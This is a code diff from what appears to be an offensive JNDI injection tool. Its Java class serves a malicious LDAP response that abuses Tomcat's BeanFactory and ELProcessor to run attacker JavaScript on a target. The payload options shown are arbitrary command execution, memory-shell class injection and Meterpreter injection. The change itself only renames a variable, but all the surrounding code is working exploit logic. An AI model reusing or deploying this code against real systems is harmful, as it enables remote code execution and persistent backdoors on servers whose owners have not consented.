@@ -30,32 +30,33 @@ public class TomcatBypassController implements LdapController {
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
+        String jscode = null;
+
         try {
             Entry e = new Entry(base);
             e.addAttribute("javaClassName", "java.lang.String");
             ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
             ref.add(new StringRefAddr("forceString", "x=eval"));
             TomcatBypassHelper helper = new TomcatBypassHelper();
-            String             code   = null;
 
             if (payloadType.contains("E-")) {
                 String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                 final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
-                code = InjShell.injectClass(EchoClass);
+                jscode = InjShell.injectClass(EchoClass);
             }
 
             if (payloadType.contains("M-")) {
                 String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                 InjShell.init(params);
-                code = Gadgets.createClassT(ClassName1);
+                jscode = Gadgets.createClassT(ClassName1);
             }
 
             if (payloadType.contains("command")) {
-                code = helper.getExecCode(params[0]);
+                jscode = helper.getExecCode(params[0]);
             }
 
             if (payloadType.contains("meterpreter")) {
-                code = helper.injectMeterpreter();
+                jscode = helper.injectMeterpreter();
             }
 
 
@@ -64,7 +65,7 @@ public class TomcatBypassController implements LdapController {
                     ".newInstance().getEngineByName(\"JavaScript\")" +
                     ".eval(\"{replacement}\")" +
                     "}";
-            String finalPayload = payloadTemplate.replace("{replacement}", code);
+            String finalPayload = payloadTemplate.replace("{replacement}", jscode);
             ref.add(new StringRefAddr("x", finalPayload));
             e.addAttribute("javaSerializedData", Util.serialize(ref));
             result.sendSearchEntry(e);
